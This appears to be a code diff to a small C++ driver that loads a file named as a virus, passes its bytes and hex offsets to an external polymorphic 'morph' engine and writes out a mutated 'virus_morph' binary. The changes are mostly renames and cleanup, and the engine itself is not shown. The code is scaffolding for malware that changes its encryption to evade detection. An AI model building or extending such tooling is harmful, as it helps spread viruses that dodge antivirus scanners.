@@ -3,10 +3,10 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <time.h>
-#include<iostream>
+#include <iostream>
 #include <fstream>
 
-extern "C" int poly_engine(char* exe_data, size_t enc_beg_offset, size_t enc_size, size_t dec_offset);
+extern "C" int morph_engine(char* exe_data, size_t virus_beg_offset, size_t virus_size, size_t dec_offset);
 using namespace std;
 int main(int argc, char* argv[])
 {
@@ -18,21 +18,22 @@ int main(int argc, char* argv[])
         return 1;
     }
 
+	// seeding rand with current time for unique encryption
 	srand(time(NULL));
 
 	// get the arguments
 	const char* virus_name = argv[1];
-	const size_t enc_offset  = strtol(argv[2], nullptr, 16);
-	const size_t enc_size    = strtol(argv[3], nullptr, 16);
-	const size_t dec_offset  = strtol(argv[4], nullptr, 16);
+	const size_t virus_offset  = strtoull(argv[2], nullptr, 16);
+	const size_t virus_size    = strtoull(argv[3], nullptr, 16);
+	const size_t dec_offset  = strtoull(argv[4], nullptr, 16);
 
 
 	// open the executable file
 	FILE* exe_file = fopen(virus_name, "rb");
 	if(!exe_file)
 	{
-		printf("Failed to open %s\n", enc_offset);
-		return -1;
+		cout << "Error opening " <<  virus_offset << endl;
+		return 1;
 	}
 
 	// get the size of the executable file
@@ -42,16 +43,16 @@ int main(int argc, char* argv[])
 	rewind(exe_file);
 
 
-    char* exe_data =  (char *) malloc(exe_size);
+    char* exe_data = new char[exe_size];
     fread(exe_data, exe_size, 1, exe_file);
-    if(poly_engine(exe_data, enc_offset, enc_size, dec_offset) != 0)
+    if(morph_engine(exe_data, virus_offset, virus_size, dec_offset) != 0)
 	{
-		printf("An error occured in the polymorphic engine\n");
+		cout << "Encoutered errors in the morph engine" << endl;
 
 	}
 
 
-    std::ofstream outfile ("virus_poly",std::ofstream::binary);
+    std::ofstream outfile ("virus_morph",std::ofstream::binary);
     // write to outfile
     outfile.write (exe_data,exe_size);
 
